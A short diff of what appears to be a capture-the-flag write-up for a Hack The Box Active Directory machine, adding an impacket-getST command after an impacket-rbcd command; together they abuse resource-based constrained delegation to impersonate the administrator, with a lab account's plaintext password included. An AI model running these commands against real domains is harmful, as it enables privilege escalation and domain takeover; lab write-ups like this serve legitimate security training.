@@ -97,7 +97,7 @@ add computer
 
 `impacket-rbcd -delegate-from 'YAWA$' -delegate-to 'DC$' -action 'write' 'support.htb' 'support.htb/support:Ironside47pleasure40Watchful'   `
 
-
+`impacket-getST -spn 'cifs/YAWA.support.htb' -impersonate 'administrator' 'support.htb/YAWA$:YAWA KA'` 
 
 ---
 <h3>QUESTIONS</h3>
